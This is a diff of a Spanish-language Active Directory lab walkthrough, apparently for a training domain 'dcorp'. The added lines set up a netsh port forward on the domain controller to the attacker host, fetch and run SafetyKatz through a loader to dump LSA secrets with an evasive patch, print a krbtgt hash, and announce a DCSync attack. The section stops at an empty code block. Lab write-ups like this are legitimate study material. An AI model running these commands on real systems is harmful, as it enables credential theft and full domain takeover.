@@ -797,5 +797,18 @@ winrs -r:dcorp-dc cmd
 Una vez conectados haremos un reenvio de puertos hacia nuestra maquina de atacante
 ```shell
 [newShell as Doamin Admin privileges]
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+
+Y ahora extraeremos los secrets de las cuentas
+```shell
+[newShell as Doamin Admin privileges]
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+```
+
+Obteniendo el hash de *krbtgt -> 4e9815869d2090ccfca61c1fe0d23986*
+Ahora deberemos obtener el hash *NTLM* y los hashes *AES* de la cuenta *krbtgt* utilizando un ataque de *DCSync*
+```shell
+[newShell as Doamin Admin privileges]
+
 ```
